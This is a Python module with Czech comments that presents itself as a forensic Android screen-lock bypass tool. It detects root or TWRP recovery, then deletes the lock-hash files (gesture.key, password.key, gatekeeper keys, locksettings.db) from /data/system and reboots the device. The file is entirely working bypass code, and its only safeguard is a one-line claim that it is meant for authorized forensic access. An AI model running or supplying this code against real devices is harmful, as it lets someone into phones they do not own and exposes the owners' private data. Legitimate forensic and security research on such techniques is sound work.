"""
core/bypass.py – Forenzní obcházení zámku obrazovky (PIN / gesto).
Určeno výhradně pro autorizovaný forenzní přístup k zařízení.
"""
from __future__ import annotations
import threading
from typing import Callable


# Soubory uchovávající hash zámku na různých verzích Androidu
LOCKSCREEN_FILES = [
    "/data/system/gesture.key",
    "/data/system/password.key",
    "/data/system/gatekeeper.password.key",
    "/data/system/gatekeeper.pattern.key",
    "/data/system/locksettings.db",
    "/data/system/locksettings.db-wal",
    "/data/system/locksettings.db-shm",
]


class BypassManager:
    def __init__(self, adb):
        self.adb = adb  # ADBManager instance

    # ── Diagnostika ───────────────────────────────────────────────────────────

    def check_root_available(self) -> tuple[bool, str]:
        """Ověří dostupnost root přístupu přes ADB shell."""
        if not self.adb.connected_device:
            return False, "Žádné zařízení není připojeno"

        # Zkusit su
        out = self.adb.shell("su -c 'id' 2>/dev/null")
        if "uid=0" in out or "root" in out:
            return True, f"su root: {out.strip()}"

        # Zkusit adbd root (volné ROM, Android ≤ 5 debug buildy)
        rc, out2, _ = self.adb._run(
            ["-s", self.adb.connected_device, "root"], timeout=10
        )
        if rc == 0 and ("restarting" in out2.lower() or "already" in out2.lower()):
            import time; time.sleep(1.5)
            out3 = self.adb.shell("id")
            if "uid=0" in out3:
                return True, "adbd root (debug build)"

        # Ověřit přímé spuštění
        out4 = self.adb.shell("id")
        if "uid=0" in out4:
            return True, "root (shell je uid=0)"

        return False, "Root není dostupný"

    def check_twrp_active(self) -> tuple[bool, str]:
        """Zjistí, zda je zařízení momentálně v TWRP recovery."""
        if not self.adb.connected_device:
            return False, "Žádné zařízení není připojeno"
        rc, state, _ = self.adb._run(
            ["-s", self.adb.connected_device, "get-state"], timeout=6
        )
        if rc != 0 or state.strip() != "recovery":
            label = {
                "device":    "Zařízení je v normálním režimu",
                "bootloader": "Zařízení je v bootloaderu (fastboot)",
                "sideload":  "Zařízení je v ADB sideload režimu",
            }.get(state.strip(), f"Stav: {state.strip() or 'neznámý'}")
            return False, label

        # Jsme v recovery – ověřit TWRP
        twrp_ver = self.adb.shell("getprop ro.twrp.version 2>/dev/null").strip()
        if twrp_ver:
            return True, f"TWRP {twrp_ver}"
        twrp_bin = self.adb.shell("ls /sbin/twrp 2>/dev/null").strip()
        if twrp_bin:
            return True, "TWRP (verze nezjištěna)"
        return True, "Recovery (neznámý typ – nemusí být TWRP)"

    def get_android_version(self) -> int:
        """Vrátí hlavní číslo verze Androidu (0 = neznámé)."""
        try:
            ver = self.adb.shell("getprop ro.build.version.release").strip()
            return int(ver.split(".")[0])
        except Exception:
            return 0

    def check_encryption(self) -> str:
        """Vrátí popis šifrování /data oddílu."""
        state = self.adb.shell("getprop ro.crypto.state 2>/dev/null").strip()
        enc_type = self.adb.shell("getprop ro.crypto.type 2>/dev/null").strip()
        if state == "encrypted":
            t = enc_type.upper() if enc_type else "FDE"
            return f"Šifrováno – {t}"
        if state == "unencrypted":
            return "Nešifrováno"
        return state or "Neznámé"

    def get_device_summary(self) -> dict:
        """Vrátí klíčové info pro zobrazení v panelu."""
        android = self.get_android_version()
        enc = self.check_encryption()
        root_ok, root_info = self.check_root_available()
        twrp_ok, twrp_info = self.check_twrp_active()
        return {
            "android": android,
            "encryption": enc,
            "root_ok": root_ok,
            "root_info": root_info,
            "twrp_ok": twrp_ok,
            "twrp_info": twrp_info,
        }

    # ── Metoda 1 – ADB root smazání ──────────────────────────────────────────

    def method_adb_root_delete(
        self,
        log: Callable[[str], None],
        done: Callable[[bool, str], None],
    ):
        """
        Smaže soubory zámku přes root ADB shell.
        Podporuje Android 4–10 s dostupným rootem (Magisk, SuperSU, adbd root).
        """
        def _worker():
            log("⏳ Ověřuji root přístup...")
            ok, info = self.check_root_available()
            if not ok:
                done(False, "Root není dostupný.\nPoužijte Metodu 2 (TWRP).")
                return
            log(f"✔ Root: {info}")

            android = self.get_android_version()
            log(f"ℹ Android {android}")

            deleted, skipped = 0, 0
            for path in LOCKSCREEN_FILES:
                # Ověřit existenci
                exists = self.adb.shell(
                    f"su -c '[ -f {path} ] && echo exists' 2>/dev/null"
                ).strip()
                if not exists:
                    log(f"  – {path.split('/')[-1]} (neexistuje)")
                    skipped += 1
                    continue
                log(f"  🗑 Mažu {path} ...")
                result = self.adb.shell(f"su -c 'rm -f \"{path}\"' 2>&1").strip()
                if result and "No such" not in result and "Permission denied" not in result:
                    log(f"    ⚠ {result}")
                else:
                    log(f"    ✔ smazáno")
                    deleted += 1

            log(f"\n✔ Smazáno: {deleted}  /  Přeskočeno: {skipped}")
            if deleted == 0:
                done(False, "Žádné soubory nebyly smazány.\n"
                            "Zámek může být uložen jinak (Android 10+, FBE).")
                return
            log("⏳ Restartuji zařízení...")
            self.adb._run(
                ["-s", self.adb.connected_device, "reboot"], timeout=10
            )
            done(True, f"Hotovo – {deleted} souborů smazáno. Zařízení se restartuje.")

        threading.Thread(target=_worker, daemon=True).start()

    # ── Metoda 2 – TWRP smazání ──────────────────────────────────────────────

    def method_twrp_delete(
        self,
        log: Callable[[str], None],
        done: Callable[[bool, str], None],
    ):
        """
        Připojí /data v TWRP a smaže soubory zámku.
        Podporuje Android 4–13 (závisí na podpoře FBE v daném buildu TWRP).
        """
        def _worker():
            log("⏳ Ověřuji TWRP recovery...")
            ok, info = self.check_twrp_active()
            if not ok:
                done(False, f"Zařízení není v TWRP recovery.\n{info}\n\n"
                            "Použijte tlačítko 'Restartovat do Recovery'.")
                return
            log(f"✔ {info}")

            android = self.get_android_version()
            enc = self.check_encryption()
            log(f"ℹ Android {android} | Šifrování: {enc}")

            if android >= 7 and "FBE" in enc.upper():
                log("⚠ FBE šifrování – přístup závisí na podpoře dešifrování ve vašem TWRP buildu")

            log("⏳ Připojuji /data oddíl...")
            # Nejprve zkusit TWRP příkaz, pak klasický mount
            mount_out = self.adb.shell(
                "twrp mount /data 2>&1 || mount -o rw /data 2>&1 || echo mounted"
            ).strip()
            log(f"  → {mount_out or 'ok'}")

            # Ověřit, že /data je přístupná
            test = self.adb.shell("ls /data/system/ 2>/dev/null | head -5").strip()
            if not test:
                done(False, "Nepodařilo se připojit /data.\n"
                            "Pravděpodobně je aktivní FBE šifrování bez podpory v TWRP.\n"
                            "Zkuste TWRP build s dešifrováním pro vaše zařízení.")
                return
            log(f"  ✔ /data přístupná (nalezeno: {test.split()[0]}...)")

            deleted, skipped = 0, 0
            for path in LOCKSCREEN_FILES:
                exists = self.adb.shell(
                    f"[ -f {path} ] && echo exists 2>/dev/null"
                ).strip()
                if not exists:
                    log(f"  – {path.split('/')[-1]} (neexistuje)")
                    skipped += 1
                    continue
                log(f"  🗑 Mažu {path} ...")
                result = self.adb.shell(f"rm -f \"{path}\" 2>&1").strip()
                if result and "No such" not in result:
                    log(f"    ⚠ {result}")
                else:
                    log(f"    ✔ smazáno")
                    deleted += 1

            log(f"\n✔ Smazáno: {deleted}  /  Přeskočeno: {skipped}")
            if deleted == 0:
                done(False, "Žádné soubory nebyly smazány.\n"
                            "Zkontrolujte, zda je /data oddíl plně dešifrovaný.")
                return
            log("⏳ Restartuji do systému...")
            self.adb.shell("reboot 2>/dev/null")
            self.adb._run(["-s", self.adb.connected_device, "reboot"], timeout=10)
            done(True, f"Hotovo – {deleted} souborů smazáno. Zařízení se restartuje.")

        threading.Thread(target=_worker, daemon=True).start()

    # ── Reboot příkazy ────────────────────────────────────────────────────────

    def reboot_recovery(self) -> tuple[bool, str]:
        if not self.adb.connected_device:
            return False, "Žádné zařízení"
        rc, out, err = self.adb._run(
            ["-s", self.adb.connected_device, "reboot", "recovery"], timeout=10
        )
        return (True, "Restartuji do recovery…") if rc == 0 else (False, err or out)

    def reboot_bootloader(self) -> tuple[bool, str]:
        if not self.adb.connected_device:
            return False, "Žádné zařízení"
        rc, out, err = self.adb._run(
            ["-s", self.adb.connected_device, "reboot", "bootloader"], timeout=10
        )
        return (True, "Restartuji do bootloaderu…") if rc == 0 else (False, err or out)

    def reboot_system(self) -> tuple[bool, str]:
        if not self.adb.connected_device:
            return False, "Žádné zařízení"
        rc, out, err = self.adb._run(
            ["-s", self.adb.connected_device, "reboot"], timeout=10
        )
        return (True, "Restartuji zařízení…") if rc == 0 else (False, err or out)
